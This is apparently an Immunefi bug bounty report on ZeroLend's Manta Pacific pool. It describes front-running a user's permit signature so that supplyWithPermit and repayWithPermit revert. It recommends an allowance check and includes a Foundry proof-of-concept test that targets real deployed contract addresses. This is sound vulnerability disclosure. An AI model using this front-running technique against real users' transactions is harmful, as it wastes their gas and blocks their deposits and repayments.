# 28938 - \[SC - Medium] Attacker can invalidate users supplyWithPermit ...

Submitted on Mar 2nd 2024 at 12:59:17 UTC by @Norah for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #28938

Report type: Smart Contract

Report severity: Medium

Target: <https://pacific-explorer.manta.network/address/0x8676e39B5D2f0d6E0d78a4208a0cCBc50504972e>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

* Where:
  * \[supplyWithPermit()]
  * \[repayWithPermit()]
  * (<https://pacific-explorer.manta.network/address/0x8676e39B5D2f0d6E0d78a4208a0cCBc50504972e?tab=contract>)
* Expected behavior:
  * The `supplyWithPermit()` and `repayWithPermit()` functions utilises the permit function so that approve and pull operations can happen in a single transaction instead of two consecutive transactions.

## Vulnerability Details

* Attack:
  * `ERC20Permit` uses the nonces mapping for replay protection. Once a signature is verified and approved, the nonce increases, invalidating the same signature being replayed.
  * `supplyWithPermit()` expects the holder to sign their tokens and provide the signature in function parameter.
  * When a `supplyWithPermit()` transaction is in the mempool, an attacker can take this signature, call the `permit` function on the token themselves.
  * Since this is a valid signature, the token accepts it and increases the nonce.
  * As a result victim transaction will revert, whenever it gets mined becuase the nonce has been already use.
  * Check POC for more detail.

## Impact Details

* Attacker can invalidate users `supplyWithPermit()` and `repayWithPermit()` transactions.
* While Attacker does not profit from this, it harms users (gas fee and opportunity cost) and protocols reputation.

## Recommendation

* In `repayWithPermit` and `supplyWithPermit` function, check if it has the approval it needs. If not, then only submit the permit signature.

```
if (IERC20(address(asset)).allowance(msg.sender,address(this)) < amount) {
           IERC20WithPermit(asset).permit(msg.sender, address(this), amount, deadline, permitV, permitR, permitS);
        }
```

* Given the fix is simple, I would suggest to implement it as there is also possibility that sophisticated attacker might uses this to delay users `repay()` transaction and gain advantage.

## References

Add any relevant links to documentation or code

## Proof of Concept

* Following is POCs demonstrating the attack vector on Manta-Pacific fork in foundry..
* To recreate please enter your RPC, and then run "forge test"

```

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test,console2} from "forge-std/Test.sol";
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);

    function permit(
    address owner,
    address spender,
    uint256 value,
    uint256 deadline,
    uint8 v,
    bytes32 r,
    bytes32 s) external;

    function DOMAIN_SEPARATOR() external view returns(bytes32);
    function nonces(address) external view returns(uint256);
}

interface IPool {

  function supplyWithPermit(
    address asset,
    uint256 amount,
    address onBehalfOf,
    uint16 referralCode,
    uint256 deadline,
    uint8 permitV,
    bytes32 permitR,
    bytes32 permitS
  ) external;

}

contract GreifingAttack is Test {

    //RPC URL
    string RPC_URL = ""; //Enter your RPC here

    IPool Pool = IPool(0x2f9bB73a8e98793e26Cb2F6C4ad037BDf1C6B269);
    IERC20 Asset  = IERC20(0x95CeF13441Be50d20cA4558CC0a27B601aC544E5);

    uint256 constant VICTIM_PRIVATE_KEY = 0xCCCC;
    address victim = vm.addr(VICTIM_PRIVATE_KEY);

    bytes32 private constant PERMIT_TYPEHASH = keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)");

    function setUp() public {

        uint256 ForkId = vm.createFork(RPC_URL);
        vm.selectFork(ForkId);

        deal(address(Asset), victim, 1000 ether);
    }

    function testPermitExploit() public {

         vm.startPrank(victim);

        //the happy path
        //victim adds liquidity with their sign using permit functionality

        uint amount = 1000 ether;
        bytes32 domainSeparator = Asset.DOMAIN_SEPARATOR();

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(
            VICTIM_PRIVATE_KEY,
            keccak256(
                abi.encodePacked(
                    "\x19\x01",
                    domainSeparator,
                    keccak256(
                        abi.encode(
                            PERMIT_TYPEHASH,
                            victim,
                            address(Pool),
                            amount,
                            Asset.nonces(victim),
                            block.timestamp
                        )
                    )
                )
            )
        );

        uint256 snapshot = vm.snapshot();

        // the victim calls the supplywithPermit function
        // with the signed permit and it succeeds as expected
        Pool.supplyWithPermit(address(Asset),amount,victim,0,block.timestamp,v,r,s);

        vm.revertTo(snapshot);

        //The griefing attack

        //Now, Before the victim's transaction gets accepted
        //the attacker takes the signature and submits it themselves
        uint256 nonceBefore = Asset.nonces(victim);
        Asset.permit(victim, address(Pool), amount, block.timestamp, v, r, s);

        //this ends up increasing the victim nonce
        assertEq(Asset.nonces(victim), nonceBefore + 1);

        //now when victim's transaction will be reverted,
        //because the nonce is already used
        vm.startPrank(victim);
        vm.expectRevert("ERC20Permit: invalid signature");
        Pool.supplyWithPermit(address(Asset),amount,victim,0,block.timestamp,v,r,s);
        vm.stopPrank();
    }

}
        

```
